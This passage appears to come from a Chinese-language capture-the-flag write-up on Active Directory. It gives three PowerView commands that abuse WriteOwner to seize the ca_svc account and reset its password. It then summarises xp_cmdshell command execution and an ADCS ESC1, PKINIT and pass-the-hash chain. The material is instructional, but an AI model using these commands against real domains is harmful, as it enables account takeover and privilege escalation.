Phase 3

DACL 劫持：WriteOwner → 接管 ca_svc

BloodHound 显示 ryan 对 ca_svc 有 WriteOwner。

🧒 儿童版 — 夺权加权改密码ryan 有权"变更 ca_svc 的房主"。先把自己变成房主，然后给自己加"换锁"的权限，最后直接换锁。三步连招。
# PowerView 三连招
Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan"
Set-DomainUserPassword -Identity "ca_svc" -AccountPassword (ConvertTo-SecureString "Password123!!" -AsPlainText -Force)

知识点总结

XLSX = ZIP。

unzip 后查 xl/sharedStrings.xml。

MSSQL xp_cmdshell。

SA 权限可启用 xp_cmdshell 执行系统命令。

DACL 劫持三连招。

WriteOwner → 夺取所有权 → WriteDacl → 加 ResetPassword → 改密码。

ADCS ESC1 + PKINIT。

伪造证书 → PKINIT 换 TGT → 从 AS-REP 提取 NTLM 哈希 → PtH。
